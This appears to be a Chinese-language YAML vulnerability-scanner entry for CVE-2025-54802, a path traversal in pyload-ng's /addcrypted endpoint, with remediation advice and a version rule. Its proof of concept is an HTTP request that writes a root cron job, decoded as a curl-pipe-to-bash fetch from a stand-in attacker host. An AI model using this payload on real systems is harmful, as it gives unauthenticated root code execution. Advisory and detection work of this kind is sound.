info:
  name: pyload-ng
  cve: CVE-2025-54802
  summary: pyLoad-ng CNL 蓝图中的路径遍历漏洞导致远程代码执行（RCE）
  details: |
    `pyload-ng` 中的 `addcrypted` 接口存在路径遍历漏洞，攻击者可通过 `package` 参数在未经身份验证的情况下将任意文件写入目标目录之外的位置。该漏洞是由于在构造 `dlc_path` 时未对用户输入进行充分净化所致。此漏洞可被用于覆盖关键系统文件，例如 cron 任务或 systemd 服务。
    #### 漏洞代码片段：
    ```python
    dlc_path = os.path.join(
        dl_path, package.replace("/", "").replace("\\", "").replace(":", "") + ".dlc"
    )
    ```
    #### 概念验证（PoC）：
    攻击者可以向 `/addcrypted` 发送一个特制的 POST 请求，以写入恶意的 cron 任务：
    ```http
    POST /addcrypted HTTP/1.1
    Host: localhost:8000
    Content-Type: application/x-www-form-urlencoded
    package=../../../../etc/cron.d/payload&crypted=KioqICogKiAqKiByb290IGN1cmwgLXMgaHR0cDovL2F0dGFja2VyLmNvbS9yLnNoIHwgYmFzaA==
    ```
    解码后的内容为：
    ```bash
    * * * * * root curl -s http://attacker.com/r.sh | bash
    ```
    这会导致以 **root 权限** 执行远程代码，构成严重的系统安全威胁。
  cvss: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  severity: CRITICAL
  security_advise: |
    1. 升级至版本 `pyload-ng >= 0.5.0b3.dev90`。
    2. 对输入实施严格校验，并限制文件路径必须位于允许的目录内。
    3. 监控系统中是否存在未经授权的 cron 修改行为或可疑载荷。
rule: version >= "0" && version < "0.5.0b3.dev90"
references:
  - https://github.com/pyload/pyload/security/advisories/GHSA-48rp-jc79-2264
  - https://nvd.nist.gov/vuln/detail/CVE-2025-54802
  - https://github.com/pyload/pyload/pull/4596
  - https://github.com/pyload/pyload/commit/70a44fe02c03bce92337b5d370d2a45caa4de3d4
  - https://github.com/pyload/pyload